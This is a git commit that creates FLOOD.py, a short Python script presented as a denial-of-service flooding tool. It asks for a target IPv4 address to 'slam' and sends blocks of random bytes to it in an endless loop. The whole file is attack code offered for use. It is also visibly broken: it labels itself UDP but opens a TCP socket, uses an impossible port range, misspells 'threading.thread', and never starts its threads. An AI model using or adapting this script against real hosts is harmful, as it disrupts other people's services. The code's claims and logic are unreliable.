a7a74b24ff9d97215b1a6510157e1398da8bda13
ACKER POSIDEN <94275268+dev17V@users.noreply.github.com>
2022-02-13 20:26:13 -0800

    Create FLOOD.py

---
+++ FLOOD.py
@@ -0,0 +1,15 @@
+#BEST UDP METHOD IN COM
+import threading,socket,random,time,sys,os
+
+def FLOOD():
+    ip = input("IPV4 TO SLAM: ")
+    port = 80
+    randport=(True,False)[port==0]
+    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+    bytes=random._urandom(15000)
+    port=(random.randint(1,15000000),port)[randport]
+    s.sendto(bytes,(ip,port))
+    while True:
+        t1 = threading.Thread(target=FLOOD)
+        t2 = threading.thread(target=FLOOD)
+FLOOD()
